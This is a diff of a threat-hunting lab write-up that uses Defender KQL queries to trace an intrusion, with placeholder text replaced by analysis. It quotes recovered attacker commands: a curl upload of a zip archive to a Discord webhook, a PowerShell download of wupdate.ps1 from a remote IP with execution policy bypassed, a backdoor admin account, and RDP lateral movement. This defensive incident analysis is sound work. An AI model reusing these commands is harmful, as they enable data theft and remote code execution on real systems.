@@ -389,7 +389,7 @@ DeviceNetworkEvents
 ```
 <img width="1271" height="311" alt="Screenshot 2026-01-07 at 7 34 43 PM" src="https://github.com/user-attachments/assets/789fc949-9046-4cd5-8c95-4361c0445ed3" />
 
-Unfortunately there is a successful outbound connection containing this file. The attacker was able to run the command 
+Unfortunately there is a successful outbound connection containing this file. The attacker was able to run the command:
 `"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`
 - `curl.exe` command line tool used to transfer data
 - `-F` form data POST request
@@ -429,8 +429,7 @@ Objective: **Identify the backdoor account username created by the attacker?**
 
 Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.
 
-BLAH BLAH BLAH 
-
+Attackers can use the `net accounts` command to manage local user accounts. If I wanted to see newly created accounts, we could search specifically for the `/add` function.
 ```KQL
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
@@ -441,7 +440,7 @@ DeviceProcessEvents
 ```
 <img width="1866" height="468" alt="Screenshot_6" src="https://github.com/user-attachments/assets/54a659f6-c966-4dc4-89f4-648ba3b30b38" />
 
-BLAH BLAH BLAH
+The attacker was able to successfully add the user account `support` as well as adding them to the Administrators local group. This account will need to be disabled as this account provides them with persistence to local admin privileges. 
 
 Flag: `support` <br>
 Timestamp: `2025-11-19T19:09:48.8977132Z`
@@ -451,17 +450,27 @@ Objective: **Identify the PowerShell script file used to automate the attack cha
 
 Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.
 
-BLAH BLAH BLAH 
+To find the actual script that was ran, I knew that the file would either be a `.ps1` or `.bat` file as they were excluded from scanning by Windows Defender. Sripts are usually ran within `temp` folders for evasion purposes. 
 ```KQL
 DeviceFileEvents
 | where DeviceName == "azuki-sl"
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
 | where FileName endswith ".ps1" or FileName endswith ".sh"
 | where FolderPath contains "temp"
+| project Timestamp, ActionType, FileName, FileSize, FolderPath, InitiatingProcessCommandLine, SHA256
+| sort by Timestamp asc
 ```
 <img width="1274" height="542" alt="Screenshot 2026-01-07 at 7 44 47 PM" src="https://github.com/user-attachments/assets/e702bc5a-3d22-491a-ad0c-af97245c063c" />
 
-BLAH BLAH BLAH
+With this qeury, I discovered `wupdate.ps1` located in `C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` that was ran by the following PowerShell script: 
+
+`powershell  -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`
+-  `ExecutionPolicy Bypass` disables powershell execution restrictions
+-  `Command` execute the following string 
+-  `Invoke-WebRequest` PowerShell using HTTP methods
+-  `Uri 'http://78.141.196.6:8080/wupdate.ps1'` downloads `wupdate.ps1` from `78.141.196.6` over port `8080`
+-  `-OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1'` save downloaded file to this folder path
+-  `UseBasicParsing` disables Windows Explorer dependency
 
 Flag: `wupdate.ps1` <br>
 Timestamp: `2025-11-19T18:49:48.7079818Z`
@@ -471,7 +480,7 @@ Objective: **What IP address was targeted for lateral movement?**
 
 Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.
 
-BLAH BLAH BLAH
+Lateral movements to other internal targets are most likely conducted over a Private IP type. So I checked `DeviceNetworkEvents` for related events
 ```KQL
 DeviceNetworkEvents
 | where DeviceName == "azuki-sl"
@@ -482,7 +491,9 @@ DeviceNetworkEvents
 ```
 <img width="1273" height="409" alt="Screenshot 2026-01-07 at 7 48 20 PM" src="https://github.com/user-attachments/assets/0ca8dd72-02c7-40f5-be19-d62baaffa59e" />
 
-BLAH BLAH BLAH
+The attacker utilized `"mstsc.exe" /v:10.1.0.188` to move laterally to another system in the network over port `3389`.
+- `mstsc.exe` Remote Desktop Protocol (RDP)
+- `/v:10.1.0.188` connect to `10.1.0.188` 
 
 Flag: `10.1.0.188` <br>
 Timestamp: `2025-11-19T19:10:42.057693Z`
@@ -492,7 +503,8 @@ Objective: **Identify the remote access tool used for lateral movement?**
 
 Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.
 
-same as above bro  BLAH BLAH BLAH BLAH
+From previous flag, we can see the attacker using `mstsc.exe`, Windows Remote Desktpo Protocol (RDP), to connect to an internal IP address. 
+
 Flag: `mstsc.exe` <br>
 Timestamp: `2025-11-19T19:10:42.057693Z`
 
